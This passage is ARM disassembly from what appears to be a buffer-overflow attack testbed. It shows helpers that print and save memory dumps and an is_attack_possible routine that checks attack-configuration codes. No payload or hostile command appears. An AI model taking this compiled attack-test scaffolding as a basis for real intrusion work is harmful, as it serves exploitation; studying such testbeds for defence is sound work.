    bbe6:	2b00      	cmp	r3, #0
    bbe8:	d00c      	beq.n	bc04 <print_payload_info+0xbc>
    bbea:	f646 0360 	movw	r3, #26720	; 0x6860
    bbee:	f2c0 0301 	movt	r3, #1
    bbf2:	681b      	ldr	r3, [r3, #0]
    bbf4:	f24d 10d0 	movw	r0, #53712	; 0xd1d0
    bbf8:	f2c0 0000 	movt	r0, #0
    bbfc:	2101      	movs	r1, #1
    bbfe:	2229      	movs	r2, #41	; 0x29
    bc00:	f7fc eea0 	blx	8944 <_init+0xb0>
    bc04:	2001      	movs	r0, #1
    bc06:	f7fc eed4 	blx	89b0 <_init+0x11c>
    bc0a:	683b      	ldr	r3, [r7, #0]
    bc0c:	685b      	ldr	r3, [r3, #4]
    bc0e:	6878      	ldr	r0, [r7, #4]
    bc10:	f24d 4100 	movw	r1, #54272	; 0xd400
    bc14:	f2c0 0100 	movt	r1, #0
    bc18:	461a      	mov	r2, r3
    bc1a:	f7fc eedc 	blx	89d4 <_init+0x140>
    bc1e:	3708      	adds	r7, #8
    bc20:	46bd      	mov	sp, r7
    bc22:	bd80      	pop	{r7, pc}

0000bc24 <print_memory>:
    bc24:	b580      	push	{r7, lr}
    bc26:	b084      	sub	sp, #16
    bc28:	af00      	add	r7, sp, #0
    bc2a:	60f8      	str	r0, [r7, #12]
    bc2c:	60b9      	str	r1, [r7, #8]
    bc2e:	607a      	str	r2, [r7, #4]
    bc30:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bc34:	f2c0 0301 	movt	r3, #1
    bc38:	68ba      	ldr	r2, [r7, #8]
    bc3a:	601a      	str	r2, [r3, #0]
    bc3c:	e01c      	b.n	bc78 <print_memory+0x54>
    bc3e:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bc42:	f2c0 0301 	movt	r3, #1
    bc46:	681a      	ldr	r2, [r3, #0]
    bc48:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bc4c:	f2c0 0301 	movt	r3, #1
    bc50:	681b      	ldr	r3, [r3, #0]
    bc52:	681b      	ldr	r3, [r3, #0]
    bc54:	68f8      	ldr	r0, [r7, #12]
    bc56:	f24d 4118 	movw	r1, #54296	; 0xd418
    bc5a:	f2c0 0100 	movt	r1, #0
    bc5e:	f7fc eeba 	blx	89d4 <_init+0x140>
    bc62:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bc66:	f2c0 0301 	movt	r3, #1
    bc6a:	681b      	ldr	r3, [r3, #0]
    bc6c:	1d1a      	adds	r2, r3, #4
    bc6e:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bc72:	f2c0 0301 	movt	r3, #1
    bc76:	601a      	str	r2, [r3, #0]
    bc78:	68ba      	ldr	r2, [r7, #8]
    bc7a:	687b      	ldr	r3, [r7, #4]
    bc7c:	441a      	add	r2, r3
    bc7e:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bc82:	f2c0 0301 	movt	r3, #1
    bc86:	681b      	ldr	r3, [r3, #0]
    bc88:	429a      	cmp	r2, r3
    bc8a:	d8d8      	bhi.n	bc3e <print_memory+0x1a>
    bc8c:	3710      	adds	r7, #16
    bc8e:	46bd      	mov	sp, r7
    bc90:	bd80      	pop	{r7, pc}
    bc92:	bf00      	nop

0000bc94 <save_memory>:
    bc94:	b580      	push	{r7, lr}
    bc96:	b084      	sub	sp, #16
    bc98:	af00      	add	r7, sp, #0
    bc9a:	60f8      	str	r0, [r7, #12]
    bc9c:	60b9      	str	r1, [r7, #8]
    bc9e:	607a      	str	r2, [r7, #4]
    bca0:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bca4:	f2c0 0301 	movt	r3, #1
    bca8:	68ba      	ldr	r2, [r7, #8]
    bcaa:	601a      	str	r2, [r3, #0]
    bcac:	f646 3320 	movw	r3, #27424	; 0x6b20
    bcb0:	f2c0 0301 	movt	r3, #1
    bcb4:	2200      	movs	r2, #0
    bcb6:	601a      	str	r2, [r3, #0]
    bcb8:	e047      	b.n	bd4a <save_memory+0xb6>
    bcba:	f646 3320 	movw	r3, #27424	; 0x6b20
    bcbe:	f2c0 0301 	movt	r3, #1
    bcc2:	681b      	ldr	r3, [r3, #0]
    bcc4:	2216      	movs	r2, #22
    bcc6:	fb02 f303 	mul.w	r3, r2, r3
    bcca:	68fa      	ldr	r2, [r7, #12]
    bccc:	4413      	add	r3, r2
    bcce:	461a      	mov	r2, r3
    bcd0:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bcd4:	f2c0 0301 	movt	r3, #1
    bcd8:	681b      	ldr	r3, [r3, #0]
    bcda:	4610      	mov	r0, r2
    bcdc:	210b      	movs	r1, #11
    bcde:	f24d 4224 	movw	r2, #54308	; 0xd424
    bce2:	f2c0 0200 	movt	r2, #0
    bce6:	f7fc ee82 	blx	89ec <_init+0x158>
    bcea:	f646 3320 	movw	r3, #27424	; 0x6b20
    bcee:	f2c0 0301 	movt	r3, #1
    bcf2:	681b      	ldr	r3, [r3, #0]
    bcf4:	2216      	movs	r2, #22
    bcf6:	fb02 f303 	mul.w	r3, r2, r3
    bcfa:	68fa      	ldr	r2, [r7, #12]
    bcfc:	4413      	add	r3, r2
    bcfe:	f103 020b 	add.w	r2, r3, #11
    bd02:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bd06:	f2c0 0301 	movt	r3, #1
    bd0a:	681b      	ldr	r3, [r3, #0]
    bd0c:	681b      	ldr	r3, [r3, #0]
    bd0e:	4610      	mov	r0, r2
    bd10:	210b      	movs	r1, #11
    bd12:	f24d 4228 	movw	r2, #54312	; 0xd428
    bd16:	f2c0 0200 	movt	r2, #0
    bd1a:	f7fc ee68 	blx	89ec <_init+0x158>
    bd1e:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bd22:	f2c0 0301 	movt	r3, #1
    bd26:	681b      	ldr	r3, [r3, #0]
    bd28:	1d1a      	adds	r2, r3, #4
    bd2a:	f646 331c 	movw	r3, #27420	; 0x6b1c
    bd2e:	f2c0 0301 	movt	r3, #1
    bd32:	601a      	str	r2, [r3, #0]
    bd34:	f646 3320 	movw	r3, #27424	; 0x6b20
    bd38:	f2c0 0301 	movt	r3, #1
    bd3c:	681b      	ldr	r3, [r3, #0]
    bd3e:	1c5a      	adds	r2, r3, #1
    bd40:	f646 3320 	movw	r3, #27424	; 0x6b20
    bd44:	f2c0 0301 	movt	r3, #1
    bd48:	601a      	str	r2, [r3, #0]
    bd4a:	f646 3320 	movw	r3, #27424	; 0x6b20
    bd4e:	f2c0 0301 	movt	r3, #1
    bd52:	681a      	ldr	r2, [r3, #0]
    bd54:	687b      	ldr	r3, [r7, #4]
    bd56:	429a      	cmp	r2, r3
    bd58:	d3af      	bcc.n	bcba <save_memory+0x26>
    bd5a:	3710      	adds	r7, #16
    bd5c:	46bd      	mov	sp, r7
    bd5e:	bd80      	pop	{r7, pc}

0000bd60 <print_two_memory_dumps>:
    bd60:	b590      	push	{r4, r7, lr}
    bd62:	b089      	sub	sp, #36	; 0x24
    bd64:	af02      	add	r7, sp, #8
    bd66:	60f8      	str	r0, [r7, #12]
    bd68:	60b9      	str	r1, [r7, #8]
    bd6a:	607a      	str	r2, [r7, #4]
    bd6c:	603b      	str	r3, [r7, #0]
    bd6e:	68f8      	ldr	r0, [r7, #12]
    bd70:	f24d 4130 	movw	r1, #54320	; 0xd430
    bd74:	f2c0 0100 	movt	r1, #0
    bd78:	f24d 423c 	movw	r2, #54332	; 0xd43c
    bd7c:	f2c0 0200 	movt	r2, #0
    bd80:	f24d 434c 	movw	r3, #54348	; 0xd44c
    bd84:	f2c0 0300 	movt	r3, #0
    bd88:	f7fc ee24 	blx	89d4 <_init+0x140>
    bd8c:	f24d 437c 	movw	r3, #54396	; 0xd47c
    bd90:	f2c0 0300 	movt	r3, #0
    bd94:	9300      	str	r3, [sp, #0]
    bd96:	f24d 4374 	movw	r3, #54388	; 0xd474
    bd9a:	f2c0 0300 	movt	r3, #0
    bd9e:	9301      	str	r3, [sp, #4]
    bda0:	68f8      	ldr	r0, [r7, #12]
    bda2:	f24d 415c 	movw	r1, #54364	; 0xd45c
    bda6:	f2c0 0100 	movt	r1, #0
    bdaa:	f24d 4274 	movw	r2, #54388	; 0xd474
    bdae:	f2c0 0200 	movt	r2, #0
    bdb2:	f24d 437c 	movw	r3, #54396	; 0xd47c
    bdb6:	f2c0 0300 	movt	r3, #0
    bdba:	f7fc ee0c 	blx	89d4 <_init+0x140>
    bdbe:	2300      	movs	r3, #0
    bdc0:	617b      	str	r3, [r7, #20]
    bdc2:	e027      	b.n	be14 <print_two_memory_dumps+0xb4>
    bdc4:	697b      	ldr	r3, [r7, #20]
    bdc6:	2216      	movs	r2, #22
    bdc8:	fb02 f303 	mul.w	r3, r2, r3
    bdcc:	68ba      	ldr	r2, [r7, #8]
    bdce:	4413      	add	r3, r2
    bdd0:	461a      	mov	r2, r3
    bdd2:	697b      	ldr	r3, [r7, #20]
    bdd4:	2116      	movs	r1, #22
    bdd6:	fb01 f303 	mul.w	r3, r1, r3
    bdda:	68b9      	ldr	r1, [r7, #8]
    bddc:	440b      	add	r3, r1
    bdde:	330b      	adds	r3, #11
    bde0:	6979      	ldr	r1, [r7, #20]
    bde2:	2016      	movs	r0, #22
    bde4:	fb00 f101 	mul.w	r1, r0, r1
    bde8:	6878      	ldr	r0, [r7, #4]
    bdea:	4401      	add	r1, r0
    bdec:	f101 000b 	add.w	r0, r1, #11
    bdf0:	6979      	ldr	r1, [r7, #20]
    bdf2:	2416      	movs	r4, #22
    bdf4:	fb04 f101 	mul.w	r1, r4, r1
    bdf8:	687c      	ldr	r4, [r7, #4]
    bdfa:	4421      	add	r1, r4
    bdfc:	9000      	str	r0, [sp, #0]
    bdfe:	9101      	str	r1, [sp, #4]
    be00:	68f8      	ldr	r0, [r7, #12]
    be02:	f24d 4184 	movw	r1, #54404	; 0xd484
    be06:	f2c0 0100 	movt	r1, #0
    be0a:	f7fc ede4 	blx	89d4 <_init+0x140>
    be0e:	697b      	ldr	r3, [r7, #20]
    be10:	3301      	adds	r3, #1
    be12:	617b      	str	r3, [r7, #20]
    be14:	697a      	ldr	r2, [r7, #20]
    be16:	683b      	ldr	r3, [r7, #0]
    be18:	429a      	cmp	r2, r3
    be1a:	d3d3      	bcc.n	bdc4 <print_two_memory_dumps+0x64>
    be1c:	f24d 409c 	movw	r0, #54428	; 0xd49c
    be20:	f2c0 0000 	movt	r0, #0
    be24:	2101      	movs	r1, #1
    be26:	2202      	movs	r2, #2
    be28:	68fb      	ldr	r3, [r7, #12]
    be2a:	f7fc ed8c 	blx	8944 <_init+0xb0>
    be2e:	371c      	adds	r7, #28
    be30:	46bd      	mov	sp, r7
    be32:	bd90      	pop	{r4, r7, pc}

0000be34 <print_three_memory_dumps>:
    be34:	b5f0      	push	{r4, r5, r6, r7, lr}
    be36:	b08b      	sub	sp, #44	; 0x2c
    be38:	af04      	add	r7, sp, #16
    be3a:	60f8      	str	r0, [r7, #12]
    be3c:	60b9      	str	r1, [r7, #8]
    be3e:	607a      	str	r2, [r7, #4]
    be40:	603b      	str	r3, [r7, #0]
    be42:	f24d 43b4 	movw	r3, #54452	; 0xd4b4
    be46:	f2c0 0300 	movt	r3, #0
    be4a:	9300      	str	r3, [sp, #0]
    be4c:	68f8      	ldr	r0, [r7, #12]
    be4e:	f24d 41a0 	movw	r1, #54432	; 0xd4a0
    be52:	f2c0 0100 	movt	r1, #0
    be56:	f24d 423c 	movw	r2, #54332	; 0xd43c
    be5a:	f2c0 0200 	movt	r2, #0
    be5e:	f24d 434c 	movw	r3, #54348	; 0xd44c
    be62:	f2c0 0300 	movt	r3, #0
    be66:	f7fc edb6 	blx	89d4 <_init+0x140>
    be6a:	f24d 437c 	movw	r3, #54396	; 0xd47c
    be6e:	f2c0 0300 	movt	r3, #0
    be72:	9300      	str	r3, [sp, #0]
    be74:	f24d 4374 	movw	r3, #54388	; 0xd474
    be78:	f2c0 0300 	movt	r3, #0
    be7c:	9301      	str	r3, [sp, #4]
    be7e:	f24d 437c 	movw	r3, #54396	; 0xd47c
    be82:	f2c0 0300 	movt	r3, #0
    be86:	9302      	str	r3, [sp, #8]
    be88:	f24d 4374 	movw	r3, #54388	; 0xd474
    be8c:	f2c0 0300 	movt	r3, #0
    be90:	9303      	str	r3, [sp, #12]
    be92:	68f8      	ldr	r0, [r7, #12]
    be94:	f24d 41c4 	movw	r1, #54468	; 0xd4c4
    be98:	f2c0 0100 	movt	r1, #0
    be9c:	f24d 4274 	movw	r2, #54388	; 0xd474
    bea0:	f2c0 0200 	movt	r2, #0
    bea4:	f24d 437c 	movw	r3, #54396	; 0xd47c
    bea8:	f2c0 0300 	movt	r3, #0
    beac:	f7fc ed92 	blx	89d4 <_init+0x140>
    beb0:	2300      	movs	r3, #0
    beb2:	617b      	str	r3, [r7, #20]
    beb4:	e038      	b.n	bf28 <print_three_memory_dumps+0xf4>
    beb6:	697b      	ldr	r3, [r7, #20]
    beb8:	2216      	movs	r2, #22
    beba:	fb02 f303 	mul.w	r3, r2, r3
    bebe:	68ba      	ldr	r2, [r7, #8]
    bec0:	4413      	add	r3, r2
    bec2:	461a      	mov	r2, r3
    bec4:	697b      	ldr	r3, [r7, #20]
    bec6:	2116      	movs	r1, #22
    bec8:	fb01 f303 	mul.w	r3, r1, r3
    becc:	68b9      	ldr	r1, [r7, #8]
    bece:	440b      	add	r3, r1
    bed0:	330b      	adds	r3, #11
    bed2:	6979      	ldr	r1, [r7, #20]
    bed4:	2016      	movs	r0, #22
    bed6:	fb00 f101 	mul.w	r1, r0, r1
    beda:	6878      	ldr	r0, [r7, #4]
    bedc:	4401      	add	r1, r0
    bede:	f101 050b 	add.w	r5, r1, #11
    bee2:	6979      	ldr	r1, [r7, #20]
    bee4:	2016      	movs	r0, #22
    bee6:	fb00 f101 	mul.w	r1, r0, r1
    beea:	6878      	ldr	r0, [r7, #4]
    beec:	4401      	add	r1, r0
    beee:	460c      	mov	r4, r1
    bef0:	6979      	ldr	r1, [r7, #20]
    bef2:	2016      	movs	r0, #22
    bef4:	fb00 f101 	mul.w	r1, r0, r1
    bef8:	6838      	ldr	r0, [r7, #0]
    befa:	4401      	add	r1, r0
    befc:	f101 000b 	add.w	r0, r1, #11
    bf00:	6979      	ldr	r1, [r7, #20]
    bf02:	2616      	movs	r6, #22
    bf04:	fb06 f101 	mul.w	r1, r6, r1
    bf08:	683e      	ldr	r6, [r7, #0]
    bf0a:	4431      	add	r1, r6
    bf0c:	9500      	str	r5, [sp, #0]
    bf0e:	9401      	str	r4, [sp, #4]
    bf10:	9002      	str	r0, [sp, #8]
    bf12:	9103      	str	r1, [sp, #12]
    bf14:	68f8      	ldr	r0, [r7, #12]
    bf16:	f24d 41c4 	movw	r1, #54468	; 0xd4c4
    bf1a:	f2c0 0100 	movt	r1, #0
    bf1e:	f7fc ed5a 	blx	89d4 <_init+0x140>
    bf22:	697b      	ldr	r3, [r7, #20]
    bf24:	3301      	adds	r3, #1
    bf26:	617b      	str	r3, [r7, #20]
    bf28:	697a      	ldr	r2, [r7, #20]
    bf2a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
    bf2c:	429a      	cmp	r2, r3
    bf2e:	d3c2      	bcc.n	beb6 <print_three_memory_dumps+0x82>
    bf30:	f24d 409c 	movw	r0, #54428	; 0xd49c
    bf34:	f2c0 0000 	movt	r0, #0
    bf38:	2101      	movs	r1, #1
    bf3a:	2202      	movs	r2, #2
    bf3c:	68fb      	ldr	r3, [r7, #12]
    bf3e:	f7fc ed02 	blx	8944 <_init+0xb0>
    bf42:	371c      	adds	r7, #28
    bf44:	46bd      	mov	sp, r7
    bf46:	bdf0      	pop	{r4, r5, r6, r7, pc}

0000bf48 <is_attack_possible>:
    bf48:	b580      	push	{r7, lr}
    bf4a:	af00      	add	r7, sp, #0
    bf4c:	f646 2388 	movw	r3, #27272	; 0x6a88
    bf50:	f2c0 0301 	movt	r3, #1
    bf54:	68db      	ldr	r3, [r3, #12]
    bf56:	f5a3 73c8 	sub.w	r3, r3, #400	; 0x190
    bf5a:	2b03      	cmp	r3, #3
    bf5c:	f200 821f 	bhi.w	c39e <is_attack_possible+0x456>
    bf60:	a201      	add	r2, pc, #4	; (adr r2, bf68 <is_attack_possible+0x20>)
    bf62:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
    bf66:	bf00      	nop
    bf68:	0000bf79 	.word	0x0000bf79
    bf6c:	0000c04f 	.word	0x0000c04f
    bf70:	0000c169 	.word	0x0000c169
    bf74:	0000c283 	.word	0x0000c283
    bf78:	f646 2388 	movw	r3, #27272	; 0x6a88
    bf7c:	f2c0 0301 	movt	r3, #1
    bf80:	681b      	ldr	r3, [r3, #0]
    bf82:	2b64      	cmp	r3, #100	; 0x64
    bf84:	d162      	bne.n	c04c <is_attack_possible+0x104>
    bf86:	f646 2388 	movw	r3, #27272	; 0x6a88
    bf8a:	f2c0 0301 	movt	r3, #1
    bf8e:	689b      	ldr	r3, [r3, #8]
    bf90:	f5b3 7f98 	cmp.w	r3, #304	; 0x130
    bf94:	d044      	beq.n	c020 <is_attack_possible+0xd8>
    bf96:	f646 2388 	movw	r3, #27272	; 0x6a88
    bf9a:	f2c0 0301 	movt	r3, #1
    bf9e:	689a      	ldr	r2, [r3, #8]
    bfa0:	f240 1331 	movw	r3, #305	; 0x131
    bfa4:	429a      	cmp	r2, r3
    bfa6:	d03b      	beq.n	c020 <is_attack_possible+0xd8>
    bfa8:	f646 2388 	movw	r3, #27272	; 0x6a88
    bfac:	f2c0 0301 	movt	r3, #1
    bfb0:	689b      	ldr	r3, [r3, #8]
    bfb2:	f5b3 7f99 	cmp.w	r3, #306	; 0x132
    bfb6:	d033      	beq.n	c020 <is_attack_possible+0xd8>
    bfb8:	f646 2388 	movw	r3, #27272	; 0x6a88
    bfbc:	f2c0 0301 	movt	r3, #1
    bfc0:	689a      	ldr	r2, [r3, #8]
    bfc2:	f240 1335 	movw	r3, #309	; 0x135
    bfc6:	429a      	cmp	r2, r3
    bfc8:	d02a      	beq.n	c020 <is_attack_possible+0xd8>
    bfca:	f646 2388 	movw	r3, #27272	; 0x6a88
    bfce:	f2c0 0301 	movt	r3, #1
    bfd2:	689b      	ldr	r3, [r3, #8]
    bfd4:	f5b3 7f9b 	cmp.w	r3, #310	; 0x136
    bfd8:	d022      	beq.n	c020 <is_attack_possible+0xd8>
    bfda:	f646 2388 	movw	r3, #27272	; 0x6a88
    bfde:	f2c0 0301 	movt	r3, #1
    bfe2:	689a      	ldr	r2, [r3, #8]
    bfe4:	f240 1337 	movw	r3, #311	; 0x137
    bfe8:	429a      	cmp	r2, r3
    bfea:	d019      	beq.n	c020 <is_attack_possible+0xd8>
    bfec:	f646 2388 	movw	r3, #27272	; 0x6a88
    bff0:	f2c0 0301 	movt	r3, #1
    bff4:	689a      	ldr	r2, [r3, #8]
    bff6:	f240 1339 	movw	r3, #313	; 0x139
    bffa:	429a      	cmp	r2, r3
    bffc:	d010      	beq.n	c020 <is_attack_possible+0xd8>
    bffe:	f646 2388 	movw	r3, #27272	; 0x6a88
    c002:	f2c0 0301 	movt	r3, #1
    c006:	689b      	ldr	r3, [r3, #8]
    c008:	f5b3 7f9d 	cmp.w	r3, #314	; 0x13a
    c00c:	d008      	beq.n	c020 <is_attack_possible+0xd8>
    c00e:	f646 2388 	movw	r3, #27272	; 0x6a88
    c012:	f2c0 0301 	movt	r3, #1
    c016:	689a      	ldr	r2, [r3, #8]
    c018:	f240 133b 	movw	r3, #315	; 0x13b
    c01c:	429a      	cmp	r2, r3
    c01e:	d115      	bne.n	c04c <is_attack_possible+0x104>
    c020:	f646 0350 	movw	r3, #26704	; 0x6850
    c024:	f2c0 0301 	movt	r3, #1
    c028:	681b      	ldr	r3, [r3, #0]
    c02a:	2b00      	cmp	r3, #0
    c02c:	d00c      	beq.n	c048 <is_attack_possible+0x100>
    c02e:	f646 0360 	movw	r3, #26720	; 0x6860
    c032:	f2c0 0301 	movt	r3, #1
    c036:	681b      	ldr	r3, [r3, #0]
    c038:	f24d 40e4 	movw	r0, #54500	; 0xd4e4
    c03c:	f2c0 0000 	movt	r0, #0
    c040:	2101      	movs	r1, #1
    c042:	2257      	movs	r2, #87	; 0x57
    c044:	f7fc ec7e 	blx	8944 <_init+0xb0>
    c048:	2300      	movs	r3, #0
    c04a:	e232      	b.n	c4b2 <is_attack_possible+0x56a>
    c04c:	e1bd      	b.n	c3ca <is_attack_possible+0x482>
    c04e:	f646 2388 	movw	r3, #27272	; 0x6a88
    c052:	f2c0 0301 	movt	r3, #1
    c056:	681b      	ldr	r3, [r3, #0]
    c058:	2b64      	cmp	r3, #100	; 0x64
    c05a:	f040 8084 	bne.w	c166 <is_attack_possible+0x21e>
    c05e:	f646 2388 	movw	r3, #27272	; 0x6a88
    c062:	f2c0 0301 	movt	r3, #1
    c066:	689b      	ldr	r3, [r3, #8]
    c068:	f5b3 7f96 	cmp.w	r3, #300	; 0x12c
    c06c:	d065      	beq.n	c13a <is_attack_possible+0x1f2>
    c06e:	f646 2388 	movw	r3, #27272	; 0x6a88
    c072:	f2c0 0301 	movt	r3, #1
    c076:	689a      	ldr	r2, [r3, #8]
    c078:	f240 132d 	movw	r3, #301	; 0x12d
    c07c:	429a      	cmp	r2, r3
    c07e:	d05c      	beq.n	c13a <is_attack_possible+0x1f2>
    c080:	f646 2388 	movw	r3, #27272	; 0x6a88
    c084:	f2c0 0301 	movt	r3, #1
    c088:	689b      	ldr	r3, [r3, #8]
    c08a:	f5b3 7f97 	cmp.w	r3, #302	; 0x12e
    c08e:	d054      	beq.n	c13a <is_attack_possible+0x1f2>
    c090:	f646 2388 	movw	r3, #27272	; 0x6a88
    c094:	f2c0 0301 	movt	r3, #1
    c098:	689a      	ldr	r2, [r3, #8]
    c09a:	f240 132f 	movw	r3, #303	; 0x12f
    c09e:	429a      	cmp	r2, r3
    c0a0:	d04b      	beq.n	c13a <is_attack_possible+0x1f2>
    c0a2:	f646 2388 	movw	r3, #27272	; 0x6a88
    c0a6:	f2c0 0301 	movt	r3, #1
    c0aa:	689a      	ldr	r2, [r3, #8]
    c0ac:	f240 1331 	movw	r3, #305	; 0x131
    c0b0:	429a      	cmp	r2, r3
    c0b2:	d042      	beq.n	c13a <is_attack_possible+0x1f2>
    c0b4:	f646 2388 	movw	r3, #27272	; 0x6a88
    c0b8:	f2c0 0301 	movt	r3, #1
    c0bc:	689b      	ldr	r3, [r3, #8]
    c0be:	f5b3 7f99 	cmp.w	r3, #306	; 0x132
    c0c2:	d03a      	beq.n	c13a <is_attack_possible+0x1f2>
    c0c4:	f646 2388 	movw	r3, #27272	; 0x6a88
    c0c8:	f2c0 0301 	movt	r3, #1
    c0cc:	689a      	ldr	r2, [r3, #8]
    c0ce:	f240 1333 	movw	r3, #307	; 0x133
    c0d2:	429a      	cmp	r2, r3
    c0d4:	d031      	beq.n	c13a <is_attack_possible+0x1f2>
    c0d6:	f646 2388 	movw	r3, #27272	; 0x6a88
    c0da:	f2c0 0301 	movt	r3, #1
    c0de:	689b      	ldr	r3, [r3, #8]
    c0e0:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    c0e4:	d029      	beq.n	c13a <is_attack_possible+0x1f2>
    c0e6:	f646 2388 	movw	r3, #27272	; 0x6a88
    c0ea:	f2c0 0301 	movt	r3, #1
    c0ee:	689b      	ldr	r3, [r3, #8]
    c0f0:	f5b3 7f9b 	cmp.w	r3, #310	; 0x136
    c0f4:	d021      	beq.n	c13a <is_attack_possible+0x1f2>
    c0f6:	f646 2388 	movw	r3, #27272	; 0x6a88
    c0fa:	f2c0 0301 	movt	r3, #1
    c0fe:	689a      	ldr	r2, [r3, #8]
    c100:	f240 1337 	movw	r3, #311	; 0x137
    c104:	429a      	cmp	r2, r3
    c106:	d018      	beq.n	c13a <is_attack_possible+0x1f2>
    c108:	f646 2388 	movw	r3, #27272	; 0x6a88
    c10c:	f2c0 0301 	movt	r3, #1
    c110:	689b      	ldr	r3, [r3, #8]
    c112:	f5b3 7f9d 	cmp.w	r3, #314	; 0x13a
    c116:	d010      	beq.n	c13a <is_attack_possible+0x1f2>
    c118:	f646 2388 	movw	r3, #27272	; 0x6a88
    c11c:	f2c0 0301 	movt	r3, #1
    c120:	689b      	ldr	r3, [r3, #8]
    c122:	f5b3 7f9c 	cmp.w	r3, #312	; 0x138
    c126:	d008      	beq.n	c13a <is_attack_possible+0x1f2>
    c128:	f646 2388 	movw	r3, #27272	; 0x6a88
    c12c:	f2c0 0301 	movt	r3, #1
    c130:	689a      	ldr	r2, [r3, #8]
    c132:	f240 133b 	movw	r3, #315	; 0x13b
    c136:	429a      	cmp	r2, r3
    c138:	d115      	bne.n	c166 <is_attack_possible+0x21e>
    c13a:	f646 0350 	movw	r3, #26704	; 0x6850
    c13e:	f2c0 0301 	movt	r3, #1
    c142:	681b      	ldr	r3, [r3, #0]
    c144:	2b00      	cmp	r3, #0
    c146:	d00c      	beq.n	c162 <is_attack_possible+0x21a>
    c148:	f646 0360 	movw	r3, #26720	; 0x6860
    c14c:	f2c0 0301 	movt	r3, #1
    c150:	681b      	ldr	r3, [r3, #0]
    c152:	f24d 503c 	movw	r0, #54588	; 0xd53c
    c156:	f2c0 0000 	movt	r0, #0
    c15a:	2101      	movs	r1, #1
    c15c:	2253      	movs	r2, #83	; 0x53
    c15e:	f7fc ebf2 	blx	8944 <_init+0xb0>
    c162:	2300      	movs	r3, #0
    c164:	e1a5      	b.n	c4b2 <is_attack_possible+0x56a>
    c166:	e130      	b.n	c3ca <is_attack_possible+0x482>
    c168:	f646 2388 	movw	r3, #27272	; 0x6a88
    c16c:	f2c0 0301 	movt	r3, #1
    c170:	681b      	ldr	r3, [r3, #0]
    c172:	2b64      	cmp	r3, #100	; 0x64
    c174:	f040 8084 	bne.w	c280 <is_attack_possible+0x338>
    c178:	f646 2388 	movw	r3, #27272	; 0x6a88
    c17c:	f2c0 0301 	movt	r3, #1
    c180:	689b      	ldr	r3, [r3, #8]
    c182:	f5b3 7f96 	cmp.w	r3, #300	; 0x12c
    c186:	d065      	beq.n	c254 <is_attack_possible+0x30c>
    c188:	f646 2388 	movw	r3, #27272	; 0x6a88
    c18c:	f2c0 0301 	movt	r3, #1
    c190:	689a      	ldr	r2, [r3, #8]
    c192:	f240 132d 	movw	r3, #301	; 0x12d
    c196:	429a      	cmp	r2, r3
    c198:	d05c      	beq.n	c254 <is_attack_possible+0x30c>
    c19a:	f646 2388 	movw	r3, #27272	; 0x6a88
    c19e:	f2c0 0301 	movt	r3, #1
    c1a2:	689b      	ldr	r3, [r3, #8]
    c1a4:	f5b3 7f97 	cmp.w	r3, #302	; 0x12e
    c1a8:	d054      	beq.n	c254 <is_attack_possible+0x30c>
    c1aa:	f646 2388 	movw	r3, #27272	; 0x6a88
    c1ae:	f2c0 0301 	movt	r3, #1
    c1b2:	689a      	ldr	r2, [r3, #8]
    c1b4:	f240 132f 	movw	r3, #303	; 0x12f
    c1b8:	429a      	cmp	r2, r3
    c1ba:	d04b      	beq.n	c254 <is_attack_possible+0x30c>
    c1bc:	f646 2388 	movw	r3, #27272	; 0x6a88
    c1c0:	f2c0 0301 	movt	r3, #1
    c1c4:	689b      	ldr	r3, [r3, #8]
    c1c6:	f5b3 7f98 	cmp.w	r3, #304	; 0x130
    c1ca:	d043      	beq.n	c254 <is_attack_possible+0x30c>
    c1cc:	f646 2388 	movw	r3, #27272	; 0x6a88
    c1d0:	f2c0 0301 	movt	r3, #1
    c1d4:	689b      	ldr	r3, [r3, #8]
    c1d6:	f5b3 7f99 	cmp.w	r3, #306	; 0x132
    c1da:	d03b      	beq.n	c254 <is_attack_possible+0x30c>
    c1dc:	f646 2388 	movw	r3, #27272	; 0x6a88
    c1e0:	f2c0 0301 	movt	r3, #1
    c1e4:	689a      	ldr	r2, [r3, #8]
    c1e6:	f240 1333 	movw	r3, #307	; 0x133
    c1ea:	429a      	cmp	r2, r3
    c1ec:	d032      	beq.n	c254 <is_attack_possible+0x30c>
    c1ee:	f646 2388 	movw	r3, #27272	; 0x6a88
    c1f2:	f2c0 0301 	movt	r3, #1
    c1f6:	689b      	ldr	r3, [r3, #8]
    c1f8:	f5b3 7f9a 	cmp.w	r3, #308	; 0x134
    c1fc:	d02a      	beq.n	c254 <is_attack_possible+0x30c>
    c1fe:	f646 2388 	movw	r3, #27272	; 0x6a88
    c202:	f2c0 0301 	movt	r3, #1
    c206:	689a      	ldr	r2, [r3, #8]
    c208:	f240 1335 	movw	r3, #309	; 0x135
    c20c:	429a      	cmp	r2, r3
    c20e:	d021      	beq.n	c254 <is_attack_possible+0x30c>
    c210:	f646 2388 	movw	r3, #27272	; 0x6a88
    c214:	f2c0 0301 	movt	r3, #1
    c218:	689a      	ldr	r2, [r3, #8]
    c21a:	f240 1337 	movw	r3, #311	; 0x137
    c21e:	429a      	cmp	r2, r3
    c220:	d018      	beq.n	c254 <is_attack_possible+0x30c>
    c222:	f646 2388 	movw	r3, #27272	; 0x6a88
    c226:	f2c0 0301 	movt	r3, #1
    c22a:	689b      	ldr	r3, [r3, #8]
    c22c:	f5b3 7f9d 	cmp.w	r3, #314	; 0x13a
    c230:	d010      	beq.n	c254 <is_attack_possible+0x30c>
    c232:	f646 2388 	movw	r3, #27272	; 0x6a88
    c236:	f2c0 0301 	movt	r3, #1
    c23a:	689b      	ldr	r3, [r3, #8]
    c23c:	f5b3 7f9c 	cmp.w	r3, #312	; 0x138
    c240:	d008      	beq.n	c254 <is_attack_possible+0x30c>
    c242:	f646 2388 	movw	r3, #27272	; 0x6a88
    c246:	f2c0 0301 	movt	r3, #1
    c24a:	689a      	ldr	r2, [r3, #8]
    c24c:	f240 1339 	movw	r3, #313	; 0x139
